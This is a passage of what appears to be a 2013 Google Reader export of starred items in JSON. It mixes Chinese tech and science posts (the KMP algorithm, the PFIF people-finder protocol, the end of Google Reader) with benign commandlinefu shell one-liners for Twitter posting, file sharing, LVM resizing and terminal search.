\"AB\"的前缀为[A]，后缀为[B]，共有元素的长度为0；</p>\n\n<p>　　－　\"ABC\"的前缀为[A, AB]，后缀为[BC, C]，共有元素的长度0；</p>\n\n<p>　　－　\"ABCD\"的前缀为[A, AB, ABC]，后缀为[BCD, CD, D]，共有元素的长度为0；</p>\n\n<p>　　－　\"ABCDA\"的前缀为[A, AB, ABC, ABCD]，后缀为[BCDA, CDA, DA, A]，共有元素为\"A\"，长度为1；</p>\n\n<p>　　－　\"ABCDAB\"的前缀为[A, AB, ABC, ABCD, ABCDA]，后缀为[BCDAB, CDAB, DAB, AB, B]，共有元素为\"AB\"，长度为2；</p>\n\n<p>　　－　\"ABCDABD\"的前缀为[A, AB, ABC, ABCD, ABCDA, ABCDAB]，后缀为[BCDABD, CDABD, DABD, ABD, BD, D]，共有元素的长度为0。</p>\n\n</blockquote>\n\n<p>16.</p>\n\n<p><img src=\"http://image.beekka.com/blog/201305/bg2013050112.png\"></p>\n\n<p>\"部分匹配\"的实质是，有时候，字符串头部和尾部会有重复。比如，\"ABCDAB\"之中有两个\"AB\"，那么它的\"部分匹配值\"就是2（\"AB\"的长度）。搜索词移动的时候，第一个\"AB\"向后移动4位（字符串长度-部分匹配值），就可以来到第二个\"AB\"的位置。</p>\n\n<p>（完）<br>\n</p><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;border:1px solid #d3d3d3;margin:1em;background-color:#aad2f0;border-radius:10px\"><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名 | <a href=\"http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh\">Creative Commons BY-NC-ND 3.0</a></li>\n<li>原文网址：<a href=\"http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html\">http://www.ruanyifeng.com/blog/2013/05/Knuth–Morris–Pratt_algorithm.html</a></li>\n<li>最后修改时间：2013年6月24日 10:58</li>\n<li>付费支持：<a href=\"https://me.alipay.com/ruanyf\"><img src=\"http://www.ruanyifeng.com/blog/images/rmb_32.png\" title=\"人民币\" alt=\"人民币 - 支付宝\" style=\"border:none;vertical-align:middle\"></a> | <a href=\"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&amp;business=yifeng.ruan@gmail.com&amp;currency_code=USD&amp;amount=0.99&amp;return=http://www.ruanyifeng.com/thank.html&amp;item_name=Ruan%20YiFeng&#39;s%20Blog&amp;undefined_quantity=1&amp;no_note=0\"><img src=\"http://www.ruanyifeng.com/blog/images/dollar_32.png\" alt=\"美元 - paypal\" title=\"美元\" style=\"border:none;vertical-align:middle\"></a> </li>\n</ul></div><div style=\"color:#556677;line-height:160%;padding:0.3em 0.5em;margin:1em;border-radius:10px\"><p><strong>[广告]</strong>　<a href=\"http://ushan.cn?utm_source=ruanyifeng.com\" style=\"border:none\">优衫（Ushan）是国内顶尖的定制西服店，常年为众多政商名流、影视明星、跨国高管定制衬衫与西服。以工艺精良、用料考究、版型出色、性价比高等特点广受各界好评。</a>\n</p>\n\n</div>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367286404345",
    "timestampUsec" : "1367286404345990",
    "id" : "tag:google.com,2005:reader/item/80dbbde4409337bb",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Update Twitter From the Linux Command Line",
    "published" : 1367230363,
    "updated" : 1367230363,
    "canonical" : [ {
      "href" : "http://www.commandlinefu.com/commands/view/12243/update-twitter-from-the-linux-command-line"
    } ],
    "alternate" : [ {
      "href" : "http://feedproxy.google.com/~r/Command-line-fu/~3/iZ4OxxKikd0/update-twitter-from-the-linux-command-line",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<code style=\"padding:5px;font-family:monospace;font-size:12pt\">$ curl -u user:pass -d status=?I am Tweeting from the shell? http://twitter.com/statuses/update.xml</code>\n<div><p>Now all you have to do is replace user by your twitter username , pass by your password and the text inside status to whatever you wish to set your status too .</p>\n<p>It uses cUrl library to post your messsage</p></div>\n<ul style=\"list-style:none;padding:0;margin:0\">\n    <li><a href=\"http://www.commandlinefu.com/commands/view/12243/update-twitter-from-the-linux-command-line\">View this command to comment, vote or add to favourites</a></li>\n    <li><a href=\"http://www.commandlinefu.com/commands/by/techie\">View all commands by <strong>techie</strong></a></li>\n</ul>\n<p><a href=\"http://www.commandlinefu.com\"><img src=\"http://www.commandlinefu.com/images/small-logo.jpg\" alt=\"commandlinefu.com\"></a></p>\n<p>by David Winterbottom (<a href=\"http://codeinthehole.com\">codeinthehole.com</a>)</p><img src=\"http://feeds.feedburner.com/~r/Command-line-fu/~4/iZ4OxxKikd0\" height=\"1\" width=\"1\">"
    },
    "author" : "techie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/Command-line-fu",
      "title" : "All commands",
      "htmlUrl" : "http://www.commandlinefu.com/commands/browse/rss"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1367283956668",
    "timestampUsec" : "1367283956668000",
    "id" : "tag:google.com,2005:reader/item/3c117d0176457caa",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Sharing a file through http 80 port:",
    "published" : 1367246399,
    "updated" : 1367246399,
    "canonical" : [ {
      "href" : "http://www.commandlinefu.com/commands/view/12246/sharing-a-file-through-http-80-port"
    } ],
    "alternate" : [ {
      "href" : "http://feedproxy.google.com/~r/Command-line-fu/~3/Olmrq4SYIPw/sharing-a-file-through-http-80-port",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<code style=\"padding:5px;font-family:monospace;font-size:12pt\">$ nc -w 5 -v -l -p 80 &lt; file.ext</code>\n<div></div>\n<ul style=\"list-style:none;padding:0;margin:0\">\n    <li><a href=\"http://www.commandlinefu.com/commands/view/12246/sharing-a-file-through-http-80-port\">View this command to comment, vote or add to favourites</a></li>\n    <li><a href=\"http://www.commandlinefu.com/commands/by/techie\">View all commands by <strong>techie</strong></a></li>\n</ul>\n<p><a href=\"http://www.commandlinefu.com\"><img src=\"http://www.commandlinefu.com/images/small-logo.jpg\" alt=\"commandlinefu.com\"></a></p>\n<p>by David Winterbottom (<a href=\"http://codeinthehole.com\">codeinthehole.com</a>)</p><img src=\"http://feeds.feedburner.com/~r/Command-line-fu/~4/Olmrq4SYIPw\" height=\"1\" width=\"1\">"
    },
    "author" : "techie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/Command-line-fu",
      "title" : "All commands",
      "htmlUrl" : "http://www.commandlinefu.com/commands/browse/rss"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1366702228223",
    "timestampUsec" : "1366702228223157",
    "id" : "tag:google.com,2005:reader/item/48710da367d82a8d",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "年少的爱，并不是为了在一起",
    "published" : 1366689372,
    "updated" : 1366773432,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/436950/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<div><p><img alt=\"\" src=\"http://img1.guokr.com/image/1f8mh37rmxnmqOxwjEqZHSWjaldr6xgk9J_xSdF2WiomAgAAbwEAAEpQ.jpg\" style=\"width:550px;height:367px\"></p>\n\n<p>荷兰奈梅亨大学行为科学学院的邵哈（Thao Ha）等人昨天在 PLoS One 发表了一项关于青少年情侣处理恋爱矛盾的研究结果。在针对成年人的研究中，<a href=\"http://www.guokr.com/article/436919/\">大量证据表明，不善于解决日常摩擦的夫妇有着更高的离婚可能性</a>，而<a href=\"http://www.guokr.com/article/436923/\">能够积极调和矛盾的夫妇则更加幸福</a>，离婚概率也相对较低。但是，在<span style=\"line-height:27.986112594604492px\">青春期</span>恋爱关系中情况则有所不同：邵哈告诉果壳网，青春期情侣分手的可能性并不取决于其处理或解决分歧的能力。也就是说，能够解决彼此间的矛盾并从中恢复过来的未成年情侣，并不趋向于拥有更长久的恋爱关系。</p>\n\n<p>邵哈的研究历时4年，观察了80对14至16岁的异性恋情侣处理矛盾的情况。在每一次调查中，受试情侣将分别选出最切身的矛盾并进行讨论。候选的矛盾状况包括：不守时或忘记约会；感情出轨或与别人接吻；父母不喜欢对方；讨厌对方的朋友；带对方参加派对；约会时不得不遵守父母的规定；感受到妒忌；以及金钱纠纷。</p>\n\n<p>随后，参与调查的未成年情侣将进行5个部分的交流调查，调查包括假象情形讨论、中立讨论、男方矛盾讨论、女方矛盾讨论以及愉快回忆讨论。研究人员将测量他们解决矛盾的方式，解决方案带给情侣的满意度、讨论时的消极情绪、从矛盾中恢复的情况、以及情侣的恋爱关系形势。受试情侣将经历4次调查，每两次调查之间间隔一年。</p>\n\n<p>研究人员惊讶地发现，无论是男生还是女生，调和矛盾所带来的满足感以及积极解决问题的表现都不会降低恋人分手的可能，能否从摩擦中恢复过来也与是否会分手无关。</p>\n\n<div><img alt=\"\" src=\"http://img1.guokr.com/image/cwgufS_9cic6Ntxd6y5gGPf93HWjPE0Exx8vecKJ-lYEAQAA_AAAAEpQ.jpg\" style=\"line-height:27.986112594604492px;width:260px;height:252px;float:left;margin-top:9px;margin-bottom:9px\"></div>\n\n<p><span style=\"line-height:28px;font-size:14px\">邵哈在文章中解释，未成年人的恋爱情景</span><span style=\"line-height:28px;font-size:14px\">和成年人的</span><span style=\"line-height:28px;font-size:14px\">有两点不同。首先，青春期情侣不太可能遭遇婚姻关系</span><span style=\"line-height:28px;font-size:14px\">中</span><span style=\"line-height:28px;font-size:14px\">那样多的</span><span style=\"line-height:28px;font-size:14px\">矛盾；而且当矛盾发生时，他们</span><span style=\"line-height:28px;font-size:14px\">倾向于否认矛盾的存在，或者对矛盾不予重视，从而降低矛盾对恋爱关系的影响。其次，未成年人</span><span style=\"line-height:28px;font-size:14px\">对恋爱关系的满足感并不取决于他们</span><span style=\"line-height:28px;font-size:14px\">处理矛盾的方式。很多青春期</span><span style=\"line-height:28px;font-size:14px\">恋爱的目标并不在于保持长期的关系，而是</span><span style=\"line-height:28px;font-size:14px\">更加看重结伴消磨时间、获得同辈赞赏，</span><span style=\"line-height:28px;font-size:14px\">以及体验亲昵行为。因此，解决问题和从中恢复的能力</span><span style=\"line-height:28px;font-size:14px\">对青春期</span><span style=\"line-height:28px;font-size:14px\">恋爱并不是至关重要的。</span></p>\n\n<p>由于各种限制，参与调查的未成年情侣相互间矛盾发生的具体时间、发生频率及严重程度这几个因素对恋情的潜在作用并未得以调查。对于十几岁的未成年人而言，分手是巨大的损失，可能导致绝望和抑郁的心境。针对青春期恋爱关系的研究还有待深入。</p>\n\n<p> </p>\n\n<p style=\"margin-top:0px;margin-right:0px;margin-left:0px;font-family:Arial,Helvetica,sans-serif\"><strong style=\"font-size:20px;color:rgb(0,128,0)\">相关的果壳网小组</strong></p>\n\n<ul><li><span style=\"font-size:16px\"><a href=\"http://www.guokr.com/group/157/\" style=\"color:rgb(0,120,182);text-decoration:initial;font-size:12px;line-height:11.399999618530273px\">校园生活</a></span></li>\n\t<li><span style=\"font-size:16px\"><a href=\"http://www.guokr.com/group/147/\" style=\"color:rgb(0,120,182);text-decoration:initial;font-size:12px;line-height:11.399999618530273px\">宅男的救赎</a></span></li>\n\t<li><span style=\"font-size:16px\"><a href=\"http://www.guokr.com/group/48/\" style=\"color:rgb(0,120,182);text-decoration:initial;font-size:12px;line-height:11.399999618530273px\">万有引力</a></span></li>\n</ul><p style=\"margin-top:0px;margin-right:0px;margin-left:0px;font-family:Arial,Helvetica,sans-serif\"> </p>\n\n<p style=\"margin-top:0px;margin-right:0px;margin-left:0px;font-family:Arial,Helvetica,sans-serif\"><strong>信息来源：</strong>EurekAlert! <br><strong>题图来源</strong>：Shutterstock</p></div><img src=\"http://analytics.guokr.com/ga.gif?utmp=/article/436950/&amp;utmac=UA-19521615-11&amp;cookie_name=utmrss&amp;guid=on&amp;utmn=217988951\">"
    },
    "author" : "Calo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1366570379691",
    "timestampUsec" : "1366570379691950",
    "id" : "tag:google.com,2005:reader/item/54ec2e9da3686835",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "技术读物", "杂项资源", "Atom", "Google", "PFIF", "RSS", "XML" ],
    "title" : "PFIF网上寻人协议",
    "published" : 1366561216,
    "updated" : 1366561216,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/9508.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>本文的主要内容来自Wikipedia(<a href=\"http://en.wikipedia.org/wiki/People_Finder_Interchange_Format\">http://en.wikipedia.org/wiki/People_Finder_Interchange_Format</a>)</p>\n<p>PFIF全称People Finder Interchange Format，是一个应用广泛的数据开源的标准协议，这个协议主要是设计用来在不同的政府、救援组织、或是其它的一些灾难中生存者和其亲人联系的网站间进行数据交换的一种协议。</p>\n<p><img alt=\"\" src=\"http://coolshell.cn//wp-content/uploads/2013/04/Google-Person-Finder.png\" width=\"492\" height=\"249\"></p>\n<p>这个协议基于XML，信息中包括人的身份标识，还有人目前的位置和状态等一些信息。PFIF可以通过Atom和RSS feed出去。PFIF可以允许不同的寻人站点进行数据交换和合并。每一条记录都有一个唯一的标识，这个标识说明了这是由哪个域名创建的。这样，当A站点获得B点的某个人的数据时，在A站点可以对这个人的增加的信息可以转到其它站点上再被增加相关的信息，因为有一个唯一的ID，所以信息可以在不同的站点上被附加。</p>\n<p>从wikipedia上看，说起PFIF这个事，得回到2001年的911事件，那时人们一共使用了超过25个不同的在线论坛和网上寻人站来查找相关的亲人和朋友（注：寻人网站英文叫：Survivor Registry，生还者登记网站）。其中一个最大的网站是由伯克利大学的学生Ka-Ping Yee 和 Miriam Walker 开发运行在Millennium计算集群上的safe.millennium.berkeley.edu网站。那时，为了减少各种网站间的混乱，伯克利的寻人网站开始从其它几个比较大的寻人站点收集相关的数据，并人肉整合到一起。</p>\n<p><span></span></p>\n<p>2005年，在<a title=\"Hurricane Katrina\" href=\"http://en.wikipedia.org/wiki/Hurricane_Katrina\">卡特里娜飓风</a> 灾难的时候，有数据百万人迁移。于是相关的寻人网站又出现了，而且比911的还要多。于是有很多的志愿者开发了一个叫 <a title=\"Katrina PeopleFinder Project\" href=\"http://en.wikipedia.org/wiki/Katrina_PeopleFinder_Project\">Katrina PeopleFinder Project（卡特里娜寻人项目）</a> 他们人肉地收集不同站点的数据，并统一格式放到一个由Salesfore.com提供一个数据库中。这个项目的组织者David Geilhufe 呼吁一个技术标准以便这些寻人网站间的数据可以自动地整合共享在一起。于是之前伯克利的那个 <a href=\"http://zesty.ca/\">Ka-Ping Yee</a> 开始和志愿者 Kieran Lal，Jonathan Plax 和 <a title=\"CiviCRM\" href=\"http://en.wikipedia.org/wiki/CiviCRM\">CiviCRM</a> 团队一同工作，于是开始了草拟了第一版的PFIF协议，其于2005年9月4日发布，1.1版于第二天发布，其中修改了一些错误。随后，Salesfore.com的数据库开始支持这一标准，然后，Yahoo!和Google的寻人网站也加入这一协议。</p>\n<p>接下来， <a title=\"2010 Haiti earthquake\" href=\"http://en.wikipedia.org/wiki/2010_Haiti_earthquake\">2010年的海地地震</a> 时，Google发布了自己的 <a title=\"Google Person Finder\" href=\"http://en.wikipedia.org/wiki/Google_Person_Finder\">Google Person Finder</a>，其基于PFIF协议和CNN，纽约时报，以及美国国家医学图书馆和其它的一些寻人网站进行数据交换。然而，PFIF1.1是基于美国的社会标准搞的，并不适用于海地。于是2010年1月26日，PFIF1.2发布，其增加了几个字段用于标记生还者的国家和国际区号，还有性别，年纪，生日，状态，还有相同人的关联。</p>\n<p>PFIF 1.3 于2011年3月发布，其主要解决了个人隐私问题，其加入了一个字段指明该信息的一个有效时间，过期的数据会被删除。PFIF1.3同时移除了英式的first-name和last-name，取而代之的是full-name。</p>\n<p>PFIF 1.4 于2012年5月发布，其加入了一个字段用于链接这个人在互联网上的个人资源链接，这样可以用于合并相同的人（比如：指向同一个微博网址），还支持了多个照片。</p>\n<p style=\"text-align:center\"><strong>PFIF1.4的Spec链接：<a href=\"http://zesty.ca/pfif/1.4/\">http://zesty.ca/pfif/1.4/ </a></strong></p>\n<p>如下的网站有软件实现了PFIF：</p>\n<ul>\n<li><a title=\"Google Person Finder\" href=\"http://en.wikipedia.org/wiki/Google_Person_Finder\">Google Person Finder</a></li>\n<li><a title=\"Sahana FOSS Disaster Management System\" href=\"http://en.wikipedia.org/wiki/Sahana_FOSS_Disaster_Management_System\">Sahana Eden</a></li>\n<li><a href=\"http://pl.nlm.nih.gov/index.php\" rel=\"nofollow\">National Library of Medicine People Locator</a></li>\n<li><a title=\"Ushahidi\" href=\"http://en.wikipedia.org/wiki/Ushahidi#Ushahidi\">Ushahidi</a></li>\n<li><a href=\"http://code.google.com/p/pfifnet/\" rel=\"nofollow\">PFIF .NET Library</a></li>\n<li><a href=\"http://erislabs.net/ianb/projects/pfif/\" rel=\"nofollow\">XML::PFIF Perl module</a></li>\n</ul>\n<p>本次四川地震，谷歌率先发布了他人寻人网站：<a href=\"https://google.org/personfinder/2013-sichuan-earthquake\">https://google.org/personfinder/2013-sichuan-earthquake</a>。接下来，国内的百度，360，搜索，一淘，CSDN，高德……都发布了自己的寻人网站，微博上，大家都在说这些企业不应该搞这么多这样的网站，这样只会造成混乱。而且大家都在呼吁大家一起运作一个网站，共享数据，共享信息。晚上，我在微博上看到了这个PFIF协议，于是写下这篇文章。</p>\n<p>关于Google 的寻人的数据可以通过Google PersonFinder API 下载和上传，这里是其API页面：</p>\n<p style=\"text-align:center\"><strong><a href=\"http://code.google.com/p/googlepersonfinder/wiki/DataAPI\">http://code.google.com/p/googlepersonfinder/wiki/DataAPI</a></strong></p>\n<div style=\"margin-top:15px;font-size:11px;color:#cc0000\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"http://coolshell.cn/\">酷壳 – CoolShell.cn</a> ，请勿用于任何商业用途）</strong></p></div>\n<div style=\"text-align:center;padding:0px;font-size:14px;margin-bottom:50px\">——=== <b>访问 <a href=\"http://coolshell.cn/404/\">酷壳404页面</a> 以支持公益事业</b> ===——</div>\n\n<div><div><h3>相关文章</h3><ul><li>2010年02月08日 -- <a href=\"http://coolshell.cn/articles/2105.html\">分享：我的Reader订阅</a></li><li>2009年04月22日 -- <a href=\"http://coolshell.cn/articles/604.html\">早期XML Schema中的open content模型</a></li><li>2011年06月29日 -- <a href=\"http://coolshell.cn/articles/4905.html\">语言的数据亲和力</a></li><li>2011年02月16日 -- <a href=\"http://coolshell.cn/articles/3684.html\">Web开发人员速查卡</a></li><li>2010年06月09日 -- <a href=\"http://coolshell.cn/articles/2504.html\">信XML，得永生！</a></li><li>2011年01月27日 -- <a href=\"http://coolshell.cn/articles/3585.html\">SOAP的S是Simple</a></li><li>2011年01月28日 -- <a href=\"http://coolshell.cn/articles/3609.html\">那些炒作过度的技术和概念</a></li><li>2011年01月19日 -- <a href=\"http://coolshell.cn/articles/3498.html\">信XML，得自信</a></li></ul><div><a href=\"http://www.zemanta.com/?wp-related-posts\">Zemanta</a></div></div></div>"
    },
    "author" : "陈皓",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://coolshell.cn/feed",
      "title" : "酷壳 - CoolShell.cn",
      "htmlUrl" : "http://coolshell.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1366480478132",
    "timestampUsec" : "1366480478132980",
    "id" : "tag:google.com,2005:reader/item/6423fe07bc1d8dd7",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Lvextend logical volume",
    "published" : 1366468151,
    "updated" : 1366468151,
    "canonical" : [ {
      "href" : "http://www.commandlinefu.com/commands/view/12195/lvextend-logical-volume"
    } ],
    "alternate" : [ {
      "href" : "http://feedproxy.google.com/~r/Command-line-fu/~3/kBa7sbTCCis/lvextend-logical-volume",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<code style=\"padding:5px;font-family:monospace;font-size:12pt\">$ lvextend -r -L+100G /dev/VG/LV</code>\n<div><p>this command extends your logical volume. then it does a resize2fs on it as well. added the -r switch to make it launch resize.</p></div>\n<ul style=\"list-style:none;padding:0;margin:0\">\n    <li><a href=\"http://www.commandlinefu.com/commands/view/12195/lvextend-logical-volume\">View this command to comment, vote or add to favourites</a></li>\n    <li><a href=\"http://www.commandlinefu.com/commands/by/bbelt16ag\">View all commands by <strong>bbelt16ag</strong></a></li>\n</ul>\n<p><a href=\"http://www.commandlinefu.com\"><img src=\"http://www.commandlinefu.com/images/small-logo.jpg\" alt=\"commandlinefu.com\"></a></p>\n<p>by David Winterbottom (<a href=\"http://codeinthehole.com\">codeinthehole.com</a>)</p><img src=\"http://feeds.feedburner.com/~r/Command-line-fu/~4/kBa7sbTCCis\" height=\"1\" width=\"1\">"
    },
    "author" : "bbelt16ag (http://www.netvibes.com/bbelt16ag)",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/Command-line-fu",
      "title" : "All commands",
      "htmlUrl" : "http://www.commandlinefu.com/commands/browse/rss"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1366468169710",
    "timestampUsec" : "1366468169710205",
    "id" : "tag:google.com,2005:reader/item/b723d3a21637f2b2",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "alfred", "workflow", "manager", "mac" ],
    "title" : "Hatmaker：管理 Alfred Workflow 的 Workflow",
    "published" : 1366453500,
    "updated" : 1369907553,
    "alternate" : [ {
      "href" : "http://lucifr.com/2013/04/20/hatmaker-a-workflow-to-manage-alfred-workflows/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p><img src=\"http://cdn.lucifr.com/uploads/alfred_hatmaker.png\" width=\"650\" title=\"Hatmaker\"></p>\n\n<p><a href=\"https://github.com/bpinto/hatmaker\">Hatmaker</a> 是一个用来管理 <a href=\"http://lucifr.com/tags/alfred\">Alfred</a> 2 workflow 的 workflow，目前版本的功能还比较简单，支持安装和升级，可过滤有更新的 workflow，使用了 @<a href=\"http://twitter.com/hzlzh\">hzlzh</a> 的 <a href=\"http://alfredworkflow.com\">alfredworkflow.com</a> 作为 Workflow 库。</p>\n\n<p>安装时因为要从 github 上把 Workflow 下载下来，文件本身比较大时对网速还是有一定要求的，没反应的要耐心等等。</p>"
    },
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://lucifr.com/atom.xml",
      "title" : "Lucifr",
      "htmlUrl" : "http://lucifr.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1366115726412",
    "timestampUsec" : "1366115726412254",
    "id" : "tag:google.com,2005:reader/item/a89badd6552c575f",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "iCal公共日历 - 中国节假日",
    "published" : 1366098608,
    "updated" : 1366272932,
    "alternate" : [ {
      "href" : "http://www.v2ex.com/t/66025#reply5",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "水果以前官方有做，今年开始没有了，于是自己做了一个，只做了从五一开始的，明年会继续更新。<br>中国节假日<br>webcal://p02-calendarws.icloud.com/ca/subscribe/1/t9JWb-dH2oLIacyLbFID8f543cZKcXGwk34MSH5X8q1wS8VVZ5JPY4HKZ4Mkl7p-4X2K74uR5joiKIH5iQMQo4L6G1954Z83hh7gmtuhNQs"
    },
    "author" : "darcy",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.v2ex.com/feed/tab/all.xml",
      "title" : "V2EX - 全部",
      "htmlUrl" : "http://www.v2ex.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1365009455243",
    "timestampUsec" : "1365009455243190",
    "id" : "tag:google.com,2005:reader/item/4ceadf43e407a260",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Search google.com on your terminal",
    "published" : 1364983001,
    "updated" : 1364983001,
    "canonical" : [ {
      "href" : "http://www.commandlinefu.com/commands/view/12120/search-google.com-on-your-terminal"
    } ],
    "alternate" : [ {
      "href" : "http://feedproxy.google.com/~r/Command-line-fu/~3/HcZBY6wOaZk/search-google.com-on-your-terminal",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<code style=\"padding:5px;font-family:monospace;font-size:12pt\">$ Q=&quot;YOURSEARCH&quot;; GOOG_URL=&quot;http://www.google.com/search?q=&quot;; AGENT=&quot;Mozilla/4.0&quot;; stream=$(curl -A &quot;$AGENT&quot; -skLm 10 &quot;${GOOG_URL}\\&quot;${Q/\\ /+}\\&quot;&quot; | grep -oP &#39;\\/url\\?q=.+?&amp;amp&#39; | sed &#39;s/\\/url?q=//;s/&amp;amp//&#39;); echo -e &quot;${stream//\\%/\\x}&quot;</code>\n<div><p>I found this command on a different site and thought you guy might enjoy it. Just change \"YOURSEARCH\" to what ever you want to search. Example, \"Linux Commands\"</p></div>\n<ul style=\"list-style:none;padding:0;margin:0\">\n    <li><a href=\"http://www.commandlinefu.com/commands/view/12120/search-google.com-on-your-terminal\">View this command to comment, vote or add to favourites</a></li>\n    <li><a href=\"http://www.commandlinefu.com/commands/by/techie\">View all commands by <strong>techie</strong></a></li>\n</ul>\n<p><a href=\"http://www.commandlinefu.com\"><img src=\"http://www.commandlinefu.com/images/small-logo.jpg\" alt=\"commandlinefu.com\"></a></p>\n<p>by David Winterbottom (<a href=\"http://codeinthehole.com\">codeinthehole.com</a>)</p><img src=\"http://feeds.feedburner.com/~r/Command-line-fu/~4/HcZBY6wOaZk\" height=\"1\" width=\"1\">"
    },
    "author" : "techie",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/Command-line-fu",
      "title" : "All commands",
      "htmlUrl" : "http://www.commandlinefu.com/commands/browse/rss"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1363953288752",
    "timestampUsec" : "1363953288752580",
    "id" : "tag:google.com,2005:reader/item/9a7c0b67b5a04638",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Distributed Computing" ],
    "title" : "从 Google Reader 关闭到冗余不做，日子甭过",
    "published" : 1363939170,
    "updated" : 1364272415,
    "alternate" : [ {
      "href" : "https://blog.delphij.net/2013/03/-google-reader.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<a href=\"http://blog.devep.net/virushuo/\">霍总</a>几天前发表了一篇blog， <a href=\"http://blog.devep.net/virushuo/2013/03/19/googlereader.html\">Google的社会化梦想与Reader</a>。我仔细想想，似乎也不全是 Google 的问题。\n\n<p>有人说，Google要做的是大众产品，而Reader是小众产品，哪怕它已经成为了半专业的工具，也并不会改变这个事实，甚至于，这反而是件火上浇油的事情。我基本上认同这个说法。</p>\n\n<p>我认为很大程度上，用户的心态也是有问题的。 Google 做出强推 Google+，砍掉 Google Reader 的决定，背后自有其商业方面的考量，至于这决定是对，是错，从用户的角度你很难有立场说\"Google这样做对了，或是这样做错了\"，能说的，最多也就是\"Google这么做哥们很不爽\"吧？</p>\n\n<p>还有人去白宫网站发请愿。靠去白宫网站发个请愿，召集几万人签名是根本没用的，至少在我看来就是这样----想要改变一个公司基于商业考量做的决定，最有效的方法就是让这个决定看起来不那么符合其商业利益，其他一切一切的手段都是无关紧要的。</p>\n        <p>为什么我们对 Google Reader 的关闭有如此强烈的反应？我认为归根结蒂是因为它不是一项能够轻易被替代的服务。我举个例子，如果有一天 Adobe Reader 宣布收费，会有人去发起几万人的投票吗？显然不会，因为它的格式标准、公开，而且功能类似的应用程序有的是。而 Google Reader 尽管采用的是公开的 RSS 标准，并且 Google 十分大气而坦荡地通过 Data Liberation Front 计划提供了导出 json 格式的好友、分享数据等等功能，可是很遗憾，并不存在那么一个可供替代的、能够导入这些数据并将其恢复到类似 Google Reader 状态的服务。</p>\n\n<p>Google 的这个决定我真正认识到这家曾经离我住的地方不到一英里、即使现在也不过才二十英里，而且聘用了我许多朋友的公司，其实和其他商业公司并没什么两样：如果一项业务不是它的主营业务，便随时有消失的可能；甚至于，这家公司现在已经甘愿冒得罪用户这样的风险去执行自己的理念，哪怕这种理念已经在一两年前已经被相当强烈地反对过，也是如此。</p>\n\n<p>但是，我认为我们每一个人都应该感谢 Google 